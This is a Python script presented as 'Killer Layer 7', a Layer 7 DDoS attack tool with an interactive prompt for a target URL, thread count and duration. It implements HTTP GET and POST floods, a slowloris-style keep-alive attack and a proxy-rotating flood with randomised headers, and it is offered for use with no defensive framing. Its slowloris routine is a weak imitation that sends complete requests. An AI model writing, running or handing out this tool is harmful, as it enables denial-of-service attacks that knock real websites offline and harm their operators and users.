import requests
import threading
import time
import random
from rich.console import Console
from rich.prompt import Prompt
from rich.panel import Panel
import pyfiglet

console = Console()
ascii_art = pyfiglet.figlet_format("Killer Layer 7", font="slant")
console.print(Panel(ascii_art, title="Welcome to Killer Layer 7", subtitle="A Layer 7 DDoS Attack Tool", style="bold cyan"))

def load_file(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file]

def http_get_flood(url, user_agents, accept_languages, enhancements):
    while True:
        headers = {
            "User-Agent": random.choice(user_agents),
            "Accept-Language": random.choice(accept_languages),
            "Accept-Encoding": random.choice(enhancements)
        }
        try:
            response = requests.get(url, headers=headers)
            console.print(f"[green]GET Request sent to {url}, Status Code: {response.status_code}[/green]")
        except requests.exceptions.RequestException as e:
            console.print(f"[red]Error: {e}[/red]")

def slowloris_attack(target, user_agents, enhancements):
    headers = {
        "User-Agent": random.choice(user_agents),
        "Connection": "keep-alive",
        "Keep-Alive": "timeout=100",
        "Accept-Encoding": random.choice(enhancements)
    }
    while True:
        try:
            s = requests.Session()
            s.get(target, headers=headers)
            time.sleep(15)
        except requests.exceptions.RequestException as e:
            console.print(f"[red]Slowloris Error: {e}[/red]")

def increase_attack(url, user_agents, post_data, accept_languages, content_types, enhancements):
    while True:
        headers = {
            "User-Agent": random.choice(user_agents),
            "Accept-Language": random.choice(accept_languages),
            "Content-Type": random.choice(content_types),
            "Accept-Encoding": random.choice(enhancements)
        }
        try:
            response = requests.post(url, headers=headers, data=random.choice(post_data))
            console.print(f"[green]POST Request sent to {url}, Status Code: {response.status_code}[/green]")
        except requests.exceptions.RequestException as e:
            console.print(f"[red]POST Error: {e}[/red]")

def http_proxy_flood(url, user_agents, proxy_list, accept_languages, enhancements):
    while True:
        proxy = random.choice(proxy_list)
        proxies = {
            "http": f"http://{proxy}",
            "https": f"http://{proxy}"
        }
        headers = {
            "User-Agent": random.choice(user_agents),
            "Accept-Language": random.choice(accept_languages),
            "Accept-Encoding": random.choice(enhancements)
        }
        try:
            response = requests.get(url, headers=headers, proxies=proxies, timeout=5)
            console.print(f"[green]Proxy GET Request via {proxy} to {url}, Status Code: {response.status_code}[/green]")
        except requests.exceptions.RequestException as e:
            console.print(f"[red]Proxy Error: {e}[/red]")

def start_attack(url, attack_type, threads, duration, user_agents, post_data=None, proxy_list=None, accept_languages=None, content_types=None, enhancements=None):
    start_time = time.time()
    threads_list = []
    while time.time() - start_time < duration:
        for _ in range(threads):
            if attack_type == "http":
                thread = threading.Thread(target=http_get_flood, args=(url, user_agents, accept_languages, enhancements))
            elif attack_type == "slowloris":
                thread = threading.Thread(target=slowloris_attack, args=(url, user_agents, enhancements))
            elif attack_type == "increase":
                thread = threading.Thread(target=increase_attack, args=(url, user_agents, post_data, accept_languages, content_types, enhancements))
            elif attack_type == "http-proxy":
                thread = threading.Thread(target=http_proxy_flood, args=(url, user_agents, proxy_list, accept_languages, enhancements))
            else:
                console.print(f"[red]Invalid attack type selected[/red]")
                return
            thread.start()
            threads_list.append(thread)
        for thread in threads_list:
            thread.join(timeout=1)

def main():
    console.print(Panel("LAYER 7: HTTP | SLOWLORIS | INCREASE | HTTP-PROXY", title="Attack Types", style="bold magenta"))
    attack_choice = Prompt.ask("[cyan]Choose attack type (http, slowloris, increase, http-proxy):[/cyan]").lower()
    url = Prompt.ask("[cyan]Enter target URL (e.g. http://example.com):[/cyan]")
    threads = Prompt.ask("[cyan]Enter number of threads:[/cyan]", default="10")
    duration = Prompt.ask("[cyan]Enter attack duration (in seconds):[/cyan]", default="60")
    
    user_agents = load_file("user_agents.txt")
    post_data = load_file("post_data.txt")
    proxy_list = load_file("proxy_list.txt")
    accept_languages = load_file("accept_languages.txt")
    content_types = load_file("content_types.txt")
    enhancements = load_file("enhancements.txt")
    
    console.print(Panel(f"Attack Type: {attack_choice}\nTarget URL: {url}\nThreads: {threads}\nDuration: {duration} seconds", title="Attack Configuration", style="bold green"))
    
    console.print("[yellow][+] Starting attack...[/yellow]")
    
    if attack_choice == "increase":
        start_attack(url, attack_choice, int(threads), int(duration), user_agents, post_data=post_data, accept_languages=accept_languages, content_types=content_types, enhancements=enhancements)
    elif attack_choice == "http-proxy":
        start_attack(url, attack_choice, int(threads), int(duration), user_agents, proxy_list=proxy_list, accept_languages=accept_languages, enhancements=enhancements)
    else:
        start_attack(url, attack_choice, int(threads), int(duration), user_agents, accept_languages=accept_languages, enhancements=enhancements)

    console.print("[yellow][+] Attack completed.[/yellow]")

if __name__ == "__main__":
    main()
